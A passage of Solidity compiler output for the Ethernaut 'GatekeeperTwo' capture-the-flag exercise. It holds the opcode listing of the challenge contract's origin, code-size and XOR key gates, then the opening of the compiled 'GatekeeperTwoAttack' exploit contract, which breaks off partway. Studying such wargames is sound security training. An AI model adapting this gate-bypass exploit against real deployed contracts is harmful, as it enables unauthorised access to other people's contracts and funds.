									".auxdata": "a264697066735822122052f28d8d0cbc2473097fae2a3c67c28c8ff92afed60ee1ec2bf7525707df22d364736f6c63430006060033",
									".code": [
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "1"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 185,
											"end": 897,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "3370204E"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH",
											"source": 0,
											"value": "9DB31D77"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 185,
											"end": 897,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 185,
											"end": 897,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 704,
											"end": 895,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 704,
											"end": 895,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 828,
											"end": 832,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 294,
											"end": 303,
											"name": "ORIGIN",
											"source": 0
										},
										{
											"begin": 280,
											"end": 303,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 280,
											"end": 303,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 280,
											"end": 290,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 280,
											"end": 303,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 280,
											"end": 303,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 280,
											"end": 303,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 280,
											"end": 303,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 272,
											"end": 304,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 272,
											"end": 304,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 272,
											"end": 304,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 272,
											"end": 304,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 357,
											"end": 363,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 413,
											"end": 421,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 401,
											"end": 422,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 396,
											"end": 422,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 396,
											"end": 422,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 454,
											"end": 455,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 449,
											"end": 450,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 449,
											"end": 455,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 441,
											"end": 456,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 441,
											"end": 456,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 441,
											"end": 456,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 441,
											"end": 456,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 801,
											"end": 809,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 669,
											"end": 670,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 664,
											"end": 665,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 657,
											"end": 670,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 547,
											"end": 670,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 547,
											"end": 670,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 628,
											"end": 636,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 621,
											"end": 637,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 621,
											"end": 637,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 588,
											"end": 598,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 49,
											"end": 53,
											"name": "PUSH",
											"source": -1,
											"value": "20"
										},
										{
											"begin": 39,
											"end": 46,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 30,
											"end": 37,
											"name": "DUP4",
											"source": -1
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SUB",
											"source": -1
										},
										{
											"begin": 13,
											"end": 20,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE",
											"source": -1
										},
										{
											"begin": 571,
											"end": 599,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 571,
											"end": 599,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 571,
											"end": 599,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 561,
											"end": 600,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 561,
											"end": 600,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 561,
											"end": 600,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 561,
											"end": 600,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 561,
											"end": 600,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 561,
											"end": 600,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 547,
											"end": 602,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 547,
											"end": 602,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 547,
											"end": 637,
											"name": "XOR",
											"source": 0
										},
										{
											"begin": 547,
											"end": 670,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 547,
											"end": 670,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 547,
											"end": 670,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 526,
											"end": 680,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 526,
											"end": 680,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 526,
											"end": 680,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 526,
											"end": 680,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 858,
											"end": 867,
											"name": "ORIGIN",
											"source": 0
										},
										{
											"begin": 848,
											"end": 855,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 848,
											"end": 855,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 848,
											"end": 867,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 848,
											"end": 867,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 848,
											"end": 867,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "OR",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "SSTORE",
											"source": 0
										},
										{
											"begin": 848,
											"end": 867,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 884,
											"end": 888,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 877,
											"end": 888,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 877,
											"end": 888,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 466,
											"end": 467,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 314,
											"end": 315,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 704,
											"end": 895,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 214,
											"end": 236,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 214,
											"end": 236,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"enter(bytes8)": "3370204e",
							"entrant()": "9db31d77"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.6+commit.6c089d02\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"bytes8\",\"name\":\"_gateKey\",\"type\":\"bytes8\"}],\"name\":\"enter\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"entrant\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":\"GatekeeperTwo\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":{\"keccak256\":\"0xf3d0f0add933fce084be65de3e3f2d809ddd0e0380fa6a688e7e2b8b522acc99\",\"urls\":[\"bzz-raw://99a046d2959f969d0d16bf4b802845f8e5f4b22a934320e239d6f86f6d84355d\",\"dweb:/ipfs/QmPB5yoc4i5Kf5x8JnL8CocxUrqQ85e9NZfXCYbSEAoG4D\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 3,
								"contract": "practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol:GatekeeperTwo",
								"label": "entrant",
								"offset": 0,
								"slot": "0",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							}
						}
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol": {
				"GatekeeperTwoAttack": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_address",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "result",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":88:567  contract GatekeeperTwoAttack {... */\n  mstore(0x40, 0x80)\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":174:565  constructor(address _address) public {... */\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":174:565  constructor(address _address) public {... */\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n    /* \"--CODEGEN--\":15:17   */\n  0x20\n    /* \"--CODEGEN--\":10:13   */\n  dup2\n    /* \"--CODEGEN--\":7:18   */\n  lt\n    /* \"--CODEGEN--\":4:6   */\n  iszero\n  tag_2\n  jumpi\n    /* \"--CODEGEN--\":31:32   */\n  0x00\n    /* \"--CODEGEN--\":28:29   */\n  dup1\n    /* \"--CODEGEN--\":21:33   */\n  revert\n    /* \"--CODEGEN--\":4:6   */\ntag_2:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":174:565  constructor(address _address) public {... */\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":244:252  _address */\n  dup1\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":221:227  target */\n  0x00\n  dup1\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":221:253  target = GatekeeperTwo(_address) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":326:340  bytes8 gateKey */\n  0x00\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol\":428:429  1 